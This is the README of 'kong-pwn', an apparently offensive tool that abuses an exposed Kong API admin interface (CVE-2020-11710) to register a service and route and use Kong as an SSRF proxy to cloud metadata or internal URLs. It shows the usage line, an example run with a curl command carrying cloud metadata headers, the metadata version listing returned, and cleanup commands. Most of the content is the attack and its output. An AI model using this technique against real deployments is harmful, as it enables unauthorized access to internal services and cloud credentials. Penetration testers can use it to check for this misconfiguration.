# kong-pwn
Use Exposed KongAPI to act like a proxy and get metadata urls or internal urls.

CVE-2020-11710 - It's not a vuln it's a misconfiguration.

How to use
---
```
usage: kong-pwn.py [-h] -u URL -s SSRF [-p PROXY]
kong-pwn.py: error: the following arguments are required: -u/--url, -s/--ssrf
```

Example
---

```
$ python3 kong-pwn.py -u http://127.0.0.1:8001
[+] Service Added [+]
[+] Route Added [+]

[+] Testing Kong for Metadata Proxy
curl http://127.0.0.1/foo/ -H "Host: metadata.local" -H "Metadata: true" -H "Metadata-Flavor: Google"

1.0
2007-01-19
2007-03-01
2007-08-29
2007-10-10
2007-12-15
2008-02-01
2008-09-01
2009-04-04
2011-01-01
2011-05-01
2012-01-12
2014-02-25
2014-11-05
2015-10-20
2016-04-19
2016-06-30
2016-09-02
2018-03-28
2018-08-17
2018-09-24
2019-10-01
latest

[+] To remove added routes and services do the following
curl -iX DELETE http://127.0.0.1:8001/routes/metadata-endpoint
curl -iX DELETE http://127.0.0.1:8001/services/metadata-endpoint
```
